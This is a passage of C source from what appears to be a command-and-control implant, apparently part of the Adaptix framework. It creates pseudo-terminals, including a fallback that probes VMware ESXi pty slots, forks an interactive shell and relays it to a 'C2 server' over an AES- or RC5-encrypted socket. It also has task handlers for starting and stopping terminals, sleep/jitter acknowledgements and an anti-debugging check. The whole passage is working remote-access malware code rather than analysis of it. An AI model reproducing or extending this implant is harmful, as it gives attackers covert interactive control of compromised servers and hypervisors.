        LOG_ERROR("open(/dev/ptmx) failed: term_id=0x%08x, errno=%d (%s)",
            term->term_id, errno, strerror(errno));

        return -1;

    }

    LOG_INFO("Trying ESXi PTY probe via /dev/ptmx: term_id=0x%08x, size=%ux%u",
        term->term_id, term->cols, term->rows);

    terminal_drain_fd(local_master);

    for (slot = 0; slot < ESXI_PTY_SLOT_COUNT; ++slot) {

        int local_slave = -1;

        int matched = 0;

        int readable = 0;

        int restore_termios = 0;

        struct termios original_tio;

        struct termios probe_tio;

        char probe_token[96];

        char probe_buf[256];

        size_t total_read = 0;

        if (!terminal_try_reserve_esxi_slot(slot, term->term_id)) {

            ++busy_slots;

            continue;

        }

        reserved_any = 1;

        LOG_INFO("Probing ESXi PTY slot %d (%s) for term_id=0x%08x",
            slot, g_esxi_pty_paths[slot], term->term_id);

        local_slave = open(g_esxi_pty_paths[slot], O_RDWR | O_NOCTTY | O_NONBLOCK);

        if (local_slave < 0) {

            LOG_WARN("open(%s) failed during ESXi PTY probe: term_id=0x%08x, errno=%d (%s)",
                g_esxi_pty_paths[slot], term->term_id, errno, strerror(errno));

            terminal_release_esxi_slot_by_id(slot, term->term_id);

            continue;

        }

        if (tcgetattr(local_slave, &original_tio) == 0) {

            probe_tio = original_tio;

            cfmakeraw(&probe_tio);

            probe_tio.c_cc[VMIN] = 0;

            probe_tio.c_cc[VTIME] = 0;

            if (tcsetattr(local_slave, TCSANOW, &probe_tio) == 0) {

                restore_termios = 1;

            }

            else {

                LOG_WARN("tcsetattr() failed during ESXi PTY probe: term_id=0x%08x, slot=%d, errno=%d (%s)",
                    term->term_id, slot, errno, strerror(errno));

            }

        }

        else {

            LOG_WARN("tcgetattr() failed during ESXi PTY probe: term_id=0x%08x, slot=%d, errno=%d (%s)",
                term->term_id, slot, errno, strerror(errno));

        }

        terminal_drain_fd(local_slave);

        terminal_drain_fd(local_master);

        snprintf(probe_token, sizeof(probe_token), "__adaptix_ptmx_probe_%08x_%d_%ld__\n",
            term->term_id, slot, (long)time(NULL));

        if (write(local_master, probe_token, strlen(probe_token)) < 0) {

            LOG_WARN("write() failed during ESXi PTY probe: term_id=0x%08x, slot=%d, errno=%d (%s)",
                term->term_id, slot, errno, strerror(errno));

        }

        else {

            readable = terminal_wait_readable(local_slave, 150);

            if (readable > 0) {

                while (total_read < sizeof(probe_buf) - 1) {

                    ssize_t n = read(local_slave, probe_buf + total_read,
                        sizeof(probe_buf) - 1 - total_read);

                    if (n > 0) {

                        total_read += (size_t)n;

                        continue;

                    }

                    if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {

                        break;

                    }

                    break;

                }

                probe_buf[total_read] = '\0';

                if (strstr(probe_buf, probe_token) != NULL) {

                    matched = 1;

                }

            }

        }

        if (restore_termios) {

            tcsetattr(local_slave, TCSANOW, &original_tio);

        }

        if (!matched) {

            LOG_INFO("ESXi PTY probe miss: term_id=0x%08x, slot=%d, token_match=0",
                term->term_id, slot);

            close(local_slave);

            terminal_release_esxi_slot_by_id(slot, term->term_id);

            continue;

        }

        if (ws && ioctl(local_slave, TIOCSWINSZ, ws) != 0) {

            LOG_WARN("TIOCSWINSZ failed on ESXi PTY: term_id=0x%08x, slot=%d, errno=%d (%s)",
                term->term_id, slot, errno, strerror(errno));

        }

        {

            int slave_flags = fcntl(local_slave, F_GETFL, 0);

            if (slave_flags >= 0) {

                fcntl(local_slave, F_SETFL, slave_flags & ~O_NONBLOCK);

            }

        }

        *master_fd = local_master;

        *slave_fd = local_slave;

        term->pty_slot = slot;

        term->using_esxi_fallback = 1;

        safe_strncpy(term->pty_path, g_esxi_pty_paths[slot], sizeof(term->pty_path));

        LOG_INFO("Matched ESXi PTY slot %d for term_id=0x%08x: path=%s",
            slot, term->term_id, term->pty_path);

        return 0;

    }

    close(local_master);

    if (!reserved_any && busy_slots >= ESXI_PTY_SLOT_COUNT) {

        LOG_ERROR("No available ESXi PTY slot: term_id=0x%08x", term->term_id);

    }

    LOG_ERROR("Failed to match any ESXi PTY slot: term_id=0x%08x", term->term_id);

    return -1;

}

static int terminal_locale_is_utf8(const char* locale_name) {

    return locale_name != NULL &&
        *locale_name != '\0' &&
        (strcasestr(locale_name, "UTF-8") != NULL || strcasestr(locale_name, "UTF8") != NULL);

}

static const char* terminal_get_effective_locale(void) {

    const char* lc_all = getenv("LC_ALL");
    if (lc_all != NULL && *lc_all != '\0') {
        return lc_all;
    }

    const char* lc_ctype = getenv("LC_CTYPE");
    if (lc_ctype != NULL && *lc_ctype != '\0') {
        return lc_ctype;
    }

    const char* lang = getenv("LANG");
    if (lang != NULL && *lang != '\0') {
        return lang;
    }

    return NULL;

}

static const char* terminal_apply_utf8_locale(const char* locale_name, int override_all) {

    if (locale_name == NULL || *locale_name == '\0') {
        return NULL;
    }

    if (setlocale(LC_CTYPE, locale_name) == NULL) {
        return NULL;
    }

    setenv("LANG", locale_name, 1);
    setenv("LC_CTYPE", locale_name, 1);
    if (override_all) {
        setenv("LC_ALL", locale_name, 1);
    }

    return locale_name;

}

static const char* terminal_configure_utf8_locale(void) {

    const char* effective_locale = terminal_get_effective_locale();
    int override_all = 0;

    if (terminal_locale_is_utf8(effective_locale)) {
        if (getenv("LC_ALL") != NULL && *getenv("LC_ALL") != '\0') {
            override_all = 1;
        }
        return terminal_apply_utf8_locale(effective_locale, override_all);
    }

    if (getenv("LC_ALL") != NULL && *getenv("LC_ALL") != '\0') {
        override_all = 1;
    }

    {
        static const char* candidates[] = { "C.UTF-8", "en_US.UTF-8" };
        size_t i;

        for (i = 0; i < sizeof(candidates) / sizeof(candidates[0]); ++i) {
            const char* selected = terminal_apply_utf8_locale(candidates[i], override_all);
            if (selected != NULL) {
                return selected;
            }
        }
    }

    return NULL;

}

static int terminal_open_pty_fallback(TerminalNode* term, const struct winsize* ws,
    int* master_fd, int* slave_fd) {

    int local_master = -1;

    int local_slave = -1;

    char slave_name[128];

    slave_name[0] = '\0';

    local_master = posix_openpt(O_RDWR | O_NOCTTY);

    if (local_master < 0) {

        LOG_ERROR("posix_openpt() failed: term_id=0x%08x, errno=%d (%s)",
            term->term_id, errno, strerror(errno));

    }

    else if (grantpt(local_master) != 0) {

        LOG_ERROR("grantpt() failed: term_id=0x%08x, errno=%d (%s)",
            term->term_id, errno, strerror(errno));

    }

    else if (unlockpt(local_master) != 0) {

        LOG_ERROR("unlockpt() failed: term_id=0x%08x, errno=%d (%s)",
            term->term_id, errno, strerror(errno));

    }

    else if (ptsname_r(local_master, slave_name, sizeof(slave_name)) != 0 || slave_name[0] == '\0') {

        LOG_ERROR("ptsname_r() failed: term_id=0x%08x, errno=%d (%s)",
            term->term_id, errno, strerror(errno));

    }

    else {

        local_slave = open(slave_name, O_RDWR | O_NOCTTY);

        if (local_slave < 0) {

            LOG_ERROR("open(%s) failed: term_id=0x%08x, errno=%d (%s)",
                slave_name, term->term_id, errno, strerror(errno));

        }

        else {

            if (ws && ioctl(local_slave, TIOCSWINSZ, ws) != 0) {

                LOG_WARN("TIOCSWINSZ failed on fallback PTY: term_id=0x%08x, size=%ux%u, errno=%d (%s)",
                    term->term_id, term->cols, term->rows, errno, strerror(errno));

            }

            *master_fd = local_master;

            *slave_fd = local_slave;

            return 0;

        }

    }

    if (local_slave >= 0) {

        close(local_slave);

    }

    if (local_master >= 0) {

        close(local_master);

    }

    LOG_WARN("Standard PTY fallback failed, trying ESXi PTY probe: term_id=0x%08x, program=%s",
        term->term_id, term->program[0] != '\0' ? term->program : "<null>");

    return terminal_open_esxi_pty_fallback(term, ws, master_fd, slave_fd);

}

static int terminal_create_pty(TerminalNode* term) {

    struct winsize ws;

    // Keep the requested terminal size but let the PTY inherit default attributes.
    memset(&ws, 0, sizeof(ws));

    ws.ws_row = term->rows;

    ws.ws_col = term->cols;

    term->pty_slot = -1;

    term->using_esxi_fallback = 0;

    term->pty_path[0] = '\0';

    term->pty_slave = -1;

    // Create PTY

    int pty_slave;

    if (openpty(&term->pty_master, &pty_slave, NULL, NULL, NULL) < 0) {

        int openpty_errno = errno;

        LOG_WARN("openpty() failed, trying fallback: term_id=0x%08x, program=%s, size=%ux%u, errno=%d (%s)",
            term->term_id,
            term->program[0] != '\0' ? term->program : "<null>",
            term->cols,
            term->rows,
            openpty_errno,
            strerror(openpty_errno));

        if (terminal_open_pty_fallback(term, &ws, &term->pty_master, &pty_slave) != 0) {

            return -1;

        }

    } else if (ioctl(pty_slave, TIOCSWINSZ, &ws) != 0) {

        LOG_WARN("TIOCSWINSZ failed after openpty: term_id=0x%08x, size=%ux%u, errno=%d (%s)",
            term->term_id,
            term->cols,
            term->rows,
            errno,
            strerror(errno));

    }



    term->pty_slave = pty_slave;

    LOG_INFO("PTY backend selected: term_id=0x%08x, backend=%s, slave=%s",
        term->term_id,
        term->using_esxi_fallback ? "esxi-ptmx" : "system-pty",
        term->using_esxi_fallback ? term->pty_path : "<system>");

    // Set non-blocking

    int flags = fcntl(term->pty_master, F_GETFL, 0);

    if (flags >= 0) {

        fcntl(term->pty_master, F_SETFL, flags | O_NONBLOCK);

    }



    // Fork shell process

    term->shell_pid = fork();



    if (term->shell_pid < 0) {

        LOG_ERROR("fork() failed: term_id=0x%08x, errno=%d (%s)",
            term->term_id, errno, strerror(errno));

        if (pty_slave >= 0) {

            close(pty_slave);

        }

        term->pty_slave = -1;

        terminal_cleanup_pty(term);

        return -1;

    }

    if (term->shell_pid == 0) {

        // ========== Child process ==========

        close(term->pty_master);



        if (setsid() < 0) {

            LOG_WARN("setsid() failed: term_id=0x%08x, errno=%d (%s)",
                term->term_id, errno, strerror(errno));

        }

        if (ioctl(pty_slave, TIOCSCTTY, 0) < 0) {

            LOG_ERROR("TIOCSCTTY failed: term_id=0x%08x, backend=%s, slave=%s, errno=%d (%s)",
                term->term_id,
                term->using_esxi_fallback ? "esxi-ptmx" : "system-pty",
                term->using_esxi_fallback ? term->pty_path : "<system>",
                errno, strerror(errno));

        }



        if (dup2(pty_slave, STDIN_FILENO) < 0 ||
            dup2(pty_slave, STDOUT_FILENO) < 0 ||
            dup2(pty_slave, STDERR_FILENO) < 0) {

            LOG_ERROR("dup2() failed: term_id=0x%08x, backend=%s, slave=%s, errno=%d (%s)",
                term->term_id,
                term->using_esxi_fallback ? "esxi-ptmx" : "system-pty",
                term->using_esxi_fallback ? term->pty_path : "<system>",
                errno, strerror(errno));

            _exit(1);

        }



        if (pty_slave > STDERR_FILENO) {

            close(pty_slave);

        }



        setenv("TERM", "xterm-256color", 1);

        //setenv("TERM", "vt100", 1);

        setenv("SHELL", term->program, 1);

        {
            const char* terminal_locale = terminal_configure_utf8_locale();
            if (terminal_locale != NULL) {
                LOG_INFO("Terminal locale configured: term_id=0x%08x, locale=%s",
                    term->term_id, terminal_locale);
            } else {
                LOG_WARN("Terminal UTF-8 locale unavailable: term_id=0x%08x",
                    term->term_id);
            }
        }







        setenv("VIMINIT", "set nocompatible | set ttimeoutlen=100 | set showmode", 1);

        //setenv("VIMINIT", "set nocompatible | set t_Co=256 | syntax on | set ttimeoutlen=100 | set showmode", 1);

        //setenv("LS_COLORS", "rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:", 1);



        //char* shell_argv[] = { term->program, NULL };

        char* shell_argv[] = { term->program, "-i", NULL };

        execvp(term->program, shell_argv);

        LOG_ERROR("execvp() failed: term_id=0x%08x, program=%s, errno=%d (%s)",
            term->term_id, term->program, errno, strerror(errno));

        _exit(1);  // exec failed

    }

    // ========== Parent process ==========

    close(pty_slave);

    term->pty_slave = -1;

    // --- Startup aliases ---

    const char* init_cmd = "alias ls='ls --color=auto' && alias grep='grep --color=auto' && clear\n";









    ssize_t init_written = write(term->pty_master, init_cmd, strlen(init_cmd));

    (void)init_written;



    LOG_INFO("PTY created: master_fd=%d, shell_pid=%d",

        term->pty_master, term->shell_pid);



    return 0;

}


static void terminal_ev_handler(struct mg_connection* c, int ev, void* ev_data) {

    (void)ev_data;

    TerminalNode* term = (TerminalNode*)c->fn_data;



    if (ev == MG_EV_CONNECT) {



        unsigned char iv_for_encrypt[AES_BLOCKLEN];

        unsigned char iv_for_decrypt[AES_BLOCKLEN];

        LOG_INFO("Terminal connected to C2 server, preparing handshake");

        term->handshake_done = 0;

        term->handshake_sent = 0;

        term->banner_done = 0;

        generate_session_key(term->term_key, sizeof(term->term_key));

        generate_session_key(term->term_iv, sizeof(term->term_iv));

        memcpy(iv_for_encrypt, term->term_iv, AES_BLOCKLEN);

        memcpy(iv_for_decrypt, term->term_iv, AES_BLOCKLEN);

        term->stream_enc_offset = 0;
        term->stream_dec_offset = 0;
#if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
        (void)iv_for_encrypt;
        (void)iv_for_decrypt;
#else
        AES_init_ctx_iv(&term->ctx_encrypt, term->term_key, iv_for_encrypt);

        AES_init_ctx_iv(&term->ctx_decrypt, term->term_key, iv_for_decrypt);
#endif

        if (send_terminal_pack_on_socket(c, term->term_id,

            term->term_key, term->term_iv) == 0) {

            term->handshake_sent = 1;

            LOG_INFO("TERMINAL_PACK sent, waiting for optional banner/stream");

        } else {

            LOG_INFO("send_terminal_pack_on_socket returned, setting is_closing = 1");

            c->is_closing = 1;

        }



    }

    else if (ev == MG_EV_READ) {



        if (!term->handshake_done) {

            size_t banner_len = 0;
            banner_probe_result_t probe = probe_optional_banner((const unsigned char*) c->recv.buf, c->recv.len,
                BANNER_PROBE_STREAM, &banner_len);

            if (!term->handshake_sent) {

                c->is_closing = 1;

                return;

            }

            if (probe == BANNER_PROBE_WAIT) {

                return;

            }

            if (probe == BANNER_PROBE_INVALID) {

                LOG_ERROR("Terminal banner prefix invalid, closing connection");

                c->is_closing = 1;

                return;

            }

            if (probe == BANNER_PROBE_CONSUME && banner_len > 0) {

                LOG_INFO("Terminal banner received: [%.*s]", (int) banner_len, c->recv.buf);

                mg_iobuf_del(&c->recv, 0, banner_len);

                term->banner_done = 1;

            } else if (probe == BANNER_PROBE_NO_BANNER) {

                LOG_INFO("Terminal stream started without banner");

            }

            term->handshake_done = 1;

            if (c->recv.len > 0) {

                #if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
                if (rc5_stream_xcrypt(term->term_key, term->term_iv, &term->stream_dec_offset, (unsigned char*) c->recv.buf, c->recv.len) != 0) {
                    c->is_closing = 1;
                    return;
                }
                #else
                AES_CTR_xcrypt_buffer(&term->ctx_decrypt, (unsigned char*) c->recv.buf, c->recv.len);
                #endif

                if (write(term->pty_master, c->recv.buf, c->recv.len) < 0) {

                    LOG_INFO("Terminal initial stream write failed, closing connection");

                    c->is_closing = 1;

                    return;

                }

                mg_iobuf_del(&c->recv, 0, c->recv.len);

            }

        }

        else {



            #if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
            if (rc5_stream_xcrypt(term->term_key, term->term_iv, &term->stream_dec_offset, (unsigned char*) c->recv.buf, c->recv.len) != 0) {
                c->is_closing = 1;
                return;
            }
            #else
            AES_CTR_xcrypt_buffer(&term->ctx_decrypt, (unsigned char*)c->recv.buf, c->recv.len);
            #endif

            ssize_t written = write(term->pty_master, c->recv.buf, c->recv.len);

            if (written < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {

                LOG_ERROR("write to PTY failed: %s", strerror(errno));

                c->is_closing = 1;

            }

            mg_iobuf_del(&c->recv, 0, c->recv.len);

        }



    }

    else if (ev == MG_EV_POLL) {





        if (term->handshake_done) {

            unsigned char buf[1024];

            ssize_t n = read(term->pty_master, buf, sizeof(buf));

            if (n > 0) {

                #if PAYLOAD_CIPHER_MODE == PAYLOAD_CIPHER_RC5
                if (rc5_stream_xcrypt(term->term_key, term->term_iv, &term->stream_enc_offset, buf, (size_t)n) != 0) {
                    c->is_closing = 1;
                    return;
                }
                #else
                AES_CTR_xcrypt_buffer(&term->ctx_encrypt, buf, n);
                #endif

                mg_send(c, buf, n);

            }

            else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {

                LOG_INFO("MG_EV_POLL111 Setting is_closing = 1");

                c->is_closing = 1;

            }

        }





        int status;

        if (term->shell_pid > 0 && waitpid(term->shell_pid, &status, WNOHANG) > 0) {

            term->shell_pid = 0;

            LOG_INFO("Shell exited, closing connection.");

            LOG_INFO("MG_EV_POLL222 Setting is_closing = 1");

            c->is_closing = 1;

        }



    }

    else if (ev == MG_EV_CLOSE) {

        LOG_INFO("Terminal connection closed, cleaning up terminal session...");

        terminal_close_pty_fds(term);



    }

}



/**



 */

static void* terminal_thread_func(void* arg) {

    TerminalNode* term = (TerminalNode*)arg;

    char current_host[256];

    char resolved_host[INET6_ADDRSTRLEN] = {0};

    int current_port;

   

    LOG_INFO("========================================");

    LOG_INFO("Terminal Thread Started");

    LOG_INFO("Term ID: 0x%08x", term->term_id);

    LOG_INFO("========================================");





    if (terminal_create_pty(term) < 0) {

        LOG_ERROR("Failed to create PTY: term_id=0x%08x, program=%s, size=%ux%u", term->term_id, term->program[0] != '\0' ? term->program : "<null>", term->cols, term->rows);

        terminal_realtime_leave(term);

        return NULL;

    }



    LOG_INFO("PTY created: master_fd=%d, shell_pid=%d",

        term->pty_master, term->shell_pid);





    get_current_c2_address(current_host, sizeof(current_host), &current_port);



    LOG_INFO("Terminal connecting to %s:%d...", current_host, current_port);



    

    struct mg_mgr* mgr = (struct mg_mgr*)malloc(sizeof(struct mg_mgr));



    mg_mgr_init(mgr);



    char full_url[320] = { 0 };

    if (prepare_connect_target(current_host, current_port,

        resolved_host, sizeof(resolved_host),

        full_url, sizeof(full_url), NULL) != 0) {

        LOG_ERROR("Terminal connect target prepare failed: %s:%d", current_host, current_port);

        term->exited = 1;

        terminal_shutdown_shell(term, 1);

        terminal_cleanup_pty(term);

        terminal_realtime_leave(term);

        mg_mgr_free(mgr);

        free(mgr);

#ifdef _WIN32

        return 0;

#else

        return NULL;

#endif

    }



    if (!is_ip_literal(current_host)) {

        LOG_INFO("Terminal resolved host: %s -> %s", current_host, resolved_host);

    }





    struct mg_connection* conn = mg_connect(mgr, full_url,

        terminal_ev_handler, term);



    LOG_INFO("DEBUG: term->running=%d, g_shutdown=%d, conn_ptr=%p",

        term->running, g_shutdown, (void*)conn);



    if (conn == NULL) {

        

        LOG_INFO("Terminal connection failed: %s:%d", current_host, current_port);

        



        term->exited = 1;

        terminal_shutdown_shell(term, 1);

        terminal_cleanup_pty(term);

        terminal_realtime_leave(term);

        mg_mgr_free(mgr);

        free(mgr);



#ifdef _WIN32

        return 0;

#else

        return NULL;

#endif

    }



    





    while (!term->should_exit && !g_shutdown) {

        mg_mgr_poll(mgr, 100);



        if (conn->is_closing || conn->is_draining) {

            LOG_INFO("Connection is closing, breaking loop...");

            break;

        }

    }





    mg_mgr_free(mgr);

    free(mgr);

    terminal_shutdown_shell(term, 1);

    terminal_cleanup_pty(term);

    term->exited = 1;

    terminal_realtime_leave(term);



#ifdef _WIN32

    return 0;

#else

    return NULL;

#endif



    

}



/**



 */

static int terminal_start(uint32_t term_id, const char* program,

    uint16_t width, uint16_t height) {

    TerminalNode* term;

    pthread_t tid;



    LOG_INFO("Starting terminal: term_id=0x%08x, program=%s, size=%ux%u",

        term_id, program, width, height);





    if (terminal_find(term_id)) {

        LOG_WARN("Terminal 0x%08x already exists", term_id);

        return -1;

    }





    term = (TerminalNode*)calloc(1, sizeof(TerminalNode));

    if (!term) {

        LOG_ERROR("Failed to allocate memory");

        return -1;

    }





    term->term_id = term_id;

    term->target_conn = NULL;

    term->pty_master = -1;

    term->pty_slave = -1;

    term->pty_slot = -1;

    term->using_esxi_fallback = 0;

    term->pty_path[0] = '\0';

    term->shell_pid = 0;

    term->should_exit = 0;

    term->realtime_held = 0;

    term->rows = height;

    term->cols = width;

    term->created_at = time(NULL);

    term->next = NULL;



    safe_strncpy(term->program, program, sizeof(term->program));



    pthread_attr_t attr;

    pthread_attr_init(&attr);



    pthread_attr_setstacksize(&attr, 4 * 1024 * 1024);





    if (pthread_create(&tid, &attr, terminal_thread_func, term) != 0) {

        LOG_ERROR("Failed to create thread: %s", strerror(errno));

        free(term);

        return -1;

    }



    term->thread = tid;

    pthread_detach(tid);





    terminal_add(term);

    terminal_realtime_enter(term);



    LOG_INFO("Terminal started (count=%d)", terminal_count());



    return 0;

}



/**



 */

static int terminal_stop(uint32_t term_id) {

    TerminalNode* term;



    LOG_INFO("Stopping terminal: term_id=0x%08x", term_id);



    term = terminal_find(term_id);

    if (!term) {

        LOG_WARN("Terminal 0x%08x not found", term_id);

        return -1;

    }



    terminal_realtime_leave(term);





    term->should_exit = 1;





    if (term->shell_pid > 0) {

        LOG_INFO("Sending SIGTERM to pid=%d", term->shell_pid);

        kill(term->shell_pid, SIGTERM);

    }



    





    if(term->target_conn)

        term->target_conn->is_closing = 1;

    



    LOG_INFO("Terminal stop signal sent (count=%d)", terminal_count());



    return 0;

}



/**



 *



 * {

 *   "type": 1,

 *   "object": [

 *     {

 *       "code": 35,           // COMMAND_TERMINAL_START

 *       "id": task_id,

 *       "data": null

 *     }

 *   ]

 * }

 *







 */

static int send_terminal_command_ack(struct mg_connection *c, uint32_t command_code, uint32_t task_id) {

    uint8_t ack_buf[32];

    size_t ack_len = 0;

    mpack_writer_t writer;



    if (c == NULL) {

        return -1;

    }



    mpack_writer_init(&writer, (char*)ack_buf, sizeof(ack_buf));

    mpack_start_map(&writer, 1);

    mpack_write_cstr(&writer, "ok");

    mpack_write_i32(&writer, 1);

    mpack_finish_map(&writer);



    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack terminal ack");

        return -1;

    }



    ack_len = mpack_writer_buffer_used(&writer);

    return send_command_response(c, command_code, task_id, ack_buf, ack_len);

}





static void handle_terminal_start(struct mg_connection* c, const shell_command_t* cmd) {
    anti_debug_check_sensitive();

    LOG_INFO("=== Shell Command ===");

    LOG_INFO("Task ID: 0x%08x", cmd->task_id);

    LOG_INFO("Term ID: 0x%08x", cmd->term_id);

    LOG_INFO("Program: %s", cmd->program);

    LOG_INFO("Terminal Size: %ux%u (width x height)", cmd->width, cmd->height);



    if (cmd->args_count > 0) {

        LOG_INFO("Arguments:");

        for (int i = 0; i < cmd->args_count; i++) {

            LOG_INFO("  [%d]: %s", i, cmd->args[i]);

        }

    }



    if (cmd->env_count > 0) {

        LOG_INFO("Environment:");

        for (int i = 0; i < cmd->env_count; i++) {

            LOG_INFO("  [%d]: %s", i, cmd->env[i]);

        }

    }



    if (cmd->cwd[0]) {

        LOG_INFO("Working Dir: %s", cmd->cwd);

    }



    LOG_INFO("=====================");



    if (terminal_start(cmd->term_id, cmd->program, cmd->width, cmd->height) < 0) {

        LOG_ERROR("Failed to start terminal");

        return;

    }



    if (send_terminal_command_ack(c, 35, cmd->task_id) < 0) {

        LOG_ERROR("Failed to send terminal start ack");

    }
}





// ????????????

static void handle_terminal_stop(struct mg_connection *c, uint32_t task_id, uint32_t term_id) {

    LOG_INFO("=== Terminal Stop Command ===");

    LOG_INFO("Term ID: 0x%08x", term_id);

    LOG_INFO("=============================");



    if (terminal_stop(term_id) < 0) {

        LOG_WARN("Terminal may already be stopped");

    }



    if (send_terminal_command_ack(c, 36, task_id) < 0) {

        LOG_ERROR("Failed to send terminal stop ack");

    }

}

static int send_command_response(struct mg_connection* c, uint32_t command_code,

    uint32_t task_id,

    const uint8_t* data, size_t data_len) {

    unsigned char buffer[65536];

    mpack_writer_t writer;





    mpack_writer_init(&writer, (char*)buffer, sizeof(buffer));



    mpack_start_map(&writer, 3);



    mpack_write_cstr(&writer, "code");

    mpack_write_u32(&writer, command_code);



    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, task_id);



    mpack_write_cstr(&writer, "data");

    mpack_write_bin(&writer, (const char*)data, data_len);



    mpack_finish_map(&writer);



    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack command response");

        return -1;

    }



    size_t packed_len = mpack_writer_buffer_used(&writer);



    LOG_DEBUG("Command response packed: %zu bytes", packed_len);





    unsigned char msg_buffer[65536];

    mpack_writer_t msg_writer;



    mpack_writer_init(&msg_writer, (char*)msg_buffer, sizeof(msg_buffer));



    mpack_start_map(&msg_writer, 2);



    mpack_write_cstr(&msg_writer, "type");

    mpack_write_u32(&msg_writer, 1);  // MSG_TYPE_TASK



    mpack_write_cstr(&msg_writer, "object");

    mpack_start_array(&msg_writer, 1);

    mpack_write_bin(&msg_writer, (const char*)buffer, packed_len);

    mpack_finish_array(&msg_writer);



    mpack_finish_map(&msg_writer);



    if (mpack_writer_destroy(&msg_writer) != mpack_ok) {

        LOG_ERROR("Failed to pack message");

        return -1;

    }



    size_t msg_len = mpack_writer_buffer_used(&msg_writer);



    LOG_DEBUG("Message packed: %zu bytes", msg_len);





    unsigned char session_key[32];





    if (session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

        fprintf(stderr, "Failed to get session key for type %d\n", PKT_TYPE_INIT_KEY);

        return -1;

    }



    if (send_packet(c, msg_buffer, msg_len, session_key) < 0) {

        LOG_ERROR("Failed to send command response");

        return -1;

    }

    main_activity_touch();



    LOG_INFO("Command response sent (task_id=0x%08x, code=%u)",

        task_id, command_code);



    return 0;

}



static int send_tunnel_control_ack(struct mg_connection* c, uint32_t command_code, uint32_t task_id) {

    uint8_t ack_buf[32];

    size_t ack_len = 0;

    mpack_writer_t writer;



    if (c == NULL) {

        return -1;

    }



    mpack_writer_init(&writer, (char*)ack_buf, sizeof(ack_buf));

    mpack_start_map(&writer, 1);

    mpack_write_cstr(&writer, "ok");

    mpack_write_i32(&writer, 1);

    mpack_finish_map(&writer);



    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack tunnel ack");

        return -1;

    }



    ack_len = mpack_writer_buffer_used(&writer);

    return send_command_response(c, command_code, task_id, ack_buf, ack_len);

}



static int send_sleep_ack(struct mg_connection* c, const sleep_command_t* sleep_cmd) {

    uint8_t ack_buf[256];

    size_t ack_len = 0;

    mpack_writer_t writer;



    if (c == NULL || sleep_cmd == NULL) {

        return -1;

    }



    mpack_writer_init(&writer, (char*)ack_buf, sizeof(ack_buf));

    mpack_start_map(&writer, 3);

    mpack_write_cstr(&writer, "ok");

    mpack_write_i32(&writer, 1);

    mpack_write_cstr(&writer, "interval");

    mpack_write_i32(&writer, sleep_cmd->interval);

    mpack_write_cstr(&writer, "jitter");

    mpack_write_i32(&writer, sleep_cmd->jitter);

    mpack_finish_map(&writer);



    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack sleep ack");

        return -1;

    }



    ack_len = mpack_writer_buffer_used(&writer);



    return send_command_response(c,

        CMD_CODE_SLEEP,

        sleep_cmd->task_id,

        ack_buf,

        ack_len);

}



static int map_connect_error_reason(int err, int timeout_flag) {

    if (timeout_flag) return 4;

    if (err == ECONNREFUSED) return 5;

    if (err == ENETUNREACH || err == EHOSTUNREACH) return 3;

    return 5;

}



static int is_ip_literal(const char* host) {

    struct in_addr ipv4_addr;

    struct in6_addr ipv6_addr;



    if (host == NULL || host[0] == '\0') {

        return 0;

    }

    if (inet_pton(AF_INET, host, &ipv4_addr) == 1) {

        return 1;

    }

    if (inet_pton(AF_INET6, host, &ipv6_addr) == 1) {

        return 1;

    }

    return 0;

}



static int build_connect_url(const char* host, int port, char* out, size_t out_size) {

    struct in6_addr ipv6_addr;

    int written;



